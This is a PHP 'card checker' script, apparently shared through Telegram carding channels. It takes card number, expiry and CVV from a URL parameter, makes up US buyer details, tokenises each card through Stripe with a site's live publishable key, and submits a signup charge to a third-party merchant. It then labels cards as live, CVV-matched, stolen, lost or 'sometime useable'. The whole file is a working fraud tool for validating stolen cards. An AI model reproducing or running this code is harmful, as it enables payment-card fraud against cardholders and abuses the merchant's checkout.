<?php
/// Link of the site:[......]/////
/// Made by Abbey Saale
/// Join @KillAliexpress & @KillAliexpressChat for more...
/// This 2 req Proxyless RAW API Made By 𝒁𝒆𝒍𝒕彡𝑨𝒅𝒂𝒓𝒔𝒉𝒀𝑻 【★🆉🆁 ™】
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mon = multiexplode(array(":", "|", ""), $lista)[1];
$year = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if(strlen($year) == 2){
$year = substr($year, -2);}
else{
$year = substr($year, 2);}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}
function saveCCN($cc) { 
$file = dirname(FILE) . "/CCN Lives.txt";
$fp = fopen($file, "a+"); 
fwrite($fp, $cc . PHP_EOL); 
fclose($fp); }
function saveLive($cc) { 
$file = dirname(FILE) . "/Live Cards.txt";
$fp = fopen($file, "a+"); 
fwrite($fp, $cc . PHP_EOL); 
fclose($fp); }
function saveCVV($cc) { 
$file = dirname(FILE) . "/CVV Lives.txt";
$fp = fopen($file, "a+"); 
fwrite($fp, $cc . PHP_EOL); 
fclose($fp); }
function saveStolenLives($cc) { 
$file = dirname(FILE) . "/Stolen Cards.txt";
$fp = fopen($file, "a+"); 
fwrite($fp, $cc . PHP_EOL); 
fclose($fp); }
function savePickupLives($cc) { 
$file = dirname(FILE) . "/Pickup Cards.txt";
$fp = fopen($file, "a+"); 
fwrite($fp, $cc . PHP_EOL); 
fclose($fp); }
function saveLostLives($cc) { 
$file = dirname(FILE) . "/Lost Cards.txt";
$fp = fopen($file, "a+"); 
fwrite($fp, $cc . PHP_EOL); 
fclose($fp); }
function saveZipLives($cc) { 
$file = dirname(FILE) . "/Incorrect Zip Cards.txt";
$fp = fopen($file, "a+"); 
fwrite($fp, $cc . PHP_EOL); 
fclose($fp); }
function saveInsufficientLives($cc) { 
$file = dirname(FILE) . "/Insufficient Fund Cards.txt";
$fp = fopen($file, "a+"); 
fwrite($fp, $cc . PHP_EOL); 
fclose($fp);}
/////////////////////////////////////BIN LOOKUP START////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else{
$bin = 'Debit';}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////
//----------------------------------------------------------------------------------------------------------------------//
$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};
//----------------------------------------------------------------------------------------------------------------------//
////////////////////////////////////===[For Authorizing Cards]////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(  
'authority: api.stripe.com',
'accept: application/json',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/v3/controller-d6986f3e9d52b141dd42ceaecb5b1145.html',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
//========================================================================================================================//
//========================================================================================================================//
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=Nalla+Boy&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'&card[address_zip]=10016&guid=ab67167f-cc7f-4074-9fbc-80abc7fd34bb841e4c&muid=6e54b87c-499f-422c-b6a6-f4a9786efc1923ba8c&sid=8fbbe993-91d4-4fef-b720-a3bf7d1c79d7f37ca0&payment_user_agent=stripe.js%2Fb3fbb1f9%3B+stripe-js-v3%2Fb3fbb1f9&time_on_page=17502&referrer=https%3A%2F%2Fmembers.smar7apps.com%2Fsignup%2Fbundle_upsell_397&key=pk_live_pLrlhjwMN50Rsak3ejoo9skE');
//========================================================================================================================//
//========================================================================================================================//
$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"id": "','"')));
////////////////////////////===============[For Charging Cards]=============////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://members.smar7apps.com/signup/bundle_upsell_397');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: members.smar7apps.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'cookie: _fbp=fb.1.1602247773312.726889277; __stripe_mid=6e54b87c-499f-422c-b6a6-f4a9786efc1923ba8c; __stripe_sid=8fbbe993-91d4-4fef-b720-a3bf7d1c79d7f37ca0; _csrf=ef3d5c9eeaba9f5733888ff557237c103e6caf3b5a9276f7d30116bc74663fa7a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22ZD23j675qGuecIqAh6MePzMD1VEC4rLh%22%3B%7D; _ga=GA1.2.1568493815.1602248054; _gid=GA1.2.1771044234.1602248054; _gat=1',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://members.smar7apps.com',
'referer: https://members.smar7apps.com/signup/bundle_upsell_397',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
//========================================================================================================================//
//========================================================================================================================//
curl_setopt($ch, CURLOPT_POSTFIELDS, '_csrf=JYjRNS5mg5eH2_VR6dMoSNSMvALfYeCEKTf1-L9hgQF_zOMGRFC0ovacgDSKmlkJvLrxZ48brcAYYbC7ixPNaQ%3D%3D&SignupForm%5Bpackage_id%5D=19&package_id=19&SignupForm%5Bfirst_name%5D=Nalla&SignupForm%5Blast_name%5D=Boy&SignupForm%5Bemail%5D=nallaboy822%40gmail.com&SignupForm%5Bpassword%5D=llllllllll&stripeToken='.$token);
//========================================================================================================================//
//========================================================================================================================//
$result = curl_exec($ch);
//////////////////////////////////==============[Card Response Start]================///////////////////////////////////////
if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED [MAARI] ♛ </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED [MAARI] ♛ </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED [MAARI] </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE  [MAARI]♛ </span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE [MAARI]/span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE [MAARI] </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE [MAARI]♛ </span></br>';
}
elseif(strpos($result, 'incorrect_zip' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED - Incorrect Zip [MAARI]♛ </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Stolen_Card - Sometime Useable [MAARI] ♛ </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Lost_Card - Sometime Useable [MAARI]♛ </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Insufficient Funds [MAARI]♛ </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Expired [MAARI]♛</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Pickup Card_Card - Sometime Useable [MAARI] ♛ </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number [MAARI] ♛</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number [MAARI]♛</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Declined [MAARI] ♛</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Generic_Decline [MAARI]♛</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Do_Not_Honor [MAARI] ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Unchecked [Proxy Dead] [MAARI] ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Fail [MAARI]♛</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Expired Card [MAARI] ♛</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Doesnt Support This Purchase [MAARI] ♛</span> </br>';
}
 else {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Proxy Dead / Error Not Listed [MAARI] ♛</span> </br>';
}
curl_close($ch);
ob_flush();
//echo $result;
/////////////////========== 2 req Proxyless RAW API Made By 𝒁𝒆𝒍𝒕彡𝑨𝒅𝒂𝒓𝒔𝒉𝒀𝑻 【★🆉🆁 ™】 ===========//////////////////
////////////////============== Join @KillAliexpress & @KillAliexpressChat for more ==============///////////////////////
?>